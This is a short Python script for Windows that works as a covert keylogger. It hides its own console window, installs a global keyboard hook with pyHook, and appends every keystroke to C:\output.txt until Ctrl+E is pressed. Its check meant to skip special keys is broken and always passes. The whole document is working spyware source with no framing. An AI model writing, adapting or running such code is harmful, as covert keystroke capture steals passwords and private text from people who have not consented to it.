import win32api
import win32console
import win32gui
import pythoncom
import pyHook

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Function to handle keyboard events
def OnKeyboardEvent(event):
    if event.Ascii == 5:  # Exit on Ctrl + E
        exit(1)
    if event.Ascii != 0 or 8:  # Ignore special keys
        with open('C:\\output.txt', 'a') as f:
            f.write(chr(event.Ascii))
    return True

# Create a hook manager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

# Wait forever
pythoncom.PumpMessages()